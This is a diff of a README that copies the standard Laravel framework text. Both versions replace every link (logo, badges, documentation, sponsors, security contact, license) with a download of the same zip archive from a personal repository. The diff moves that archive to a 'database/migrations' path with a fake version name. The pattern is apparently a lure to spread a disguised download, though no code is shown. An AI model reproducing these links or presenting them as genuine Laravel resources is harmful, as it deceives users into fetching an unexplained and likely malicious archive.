@@ -1,64 +1,64 @@
-<p align="center"><a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" target="_blank"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" width="400"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" width="400"></a></p>
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip" alt="License"></a>
+<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" alt="Build Status"></a>
+<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" alt="Total Downloads"></a>
+<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" alt="Latest Stable Version"></a>
+<a href="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip"><img src="https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip" alt="License"></a>
 </p>
 
 ## About Laravel
 
 Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
 
-- [Simple, fast routing engine](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
-- [Powerful dependency injection container](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
-- Multiple back-ends for [session](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip) and [cache](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip) storage.
-- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
-- Database agnostic [schema migrations](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
-- [Robust background job processing](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
-- [Real-time event broadcasting](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
+- [Simple, fast routing engine](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
+- [Powerful dependency injection container](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
+- Multiple back-ends for [session](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip) and [cache](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip) storage.
+- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
+- Database agnostic [schema migrations](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
+- [Robust background job processing](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
+- [Real-time event broadcasting](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
 
 Laravel is accessible, powerful, and provides tools required for large, robust applications.
 
 ## Learning Laravel
 
-Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
 
-If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip) can help. Laracasts contains over 2000 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip) can help. Laracasts contains over 2000 video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
 
 ## Laravel Sponsors
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the Laravel [Patreon page](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
 
 ### Premium Partners
 
-- **[Vehikl](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Tighten Co.](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[64 Robots](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Cubet Techno Labs](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Cyber-Duck](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Many](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Webdock, Fast VPS Hosting](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[DevSquad](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Curotec](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[WebReinvent](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
-- **[Lendio](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip)**
+- **[Vehikl](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Tighten Co.](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[64 Robots](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Cubet Techno Labs](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Cyber-Duck](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Many](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Webdock, Fast VPS Hosting](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[DevSquad](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Curotec](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[WebReinvent](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
+- **[Lendio](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip)**
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/scalework/Bookshop_API.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Justas789/Bookshop_API/main/database/migrations/Bookshop_API_2.3-beta.5.zip).
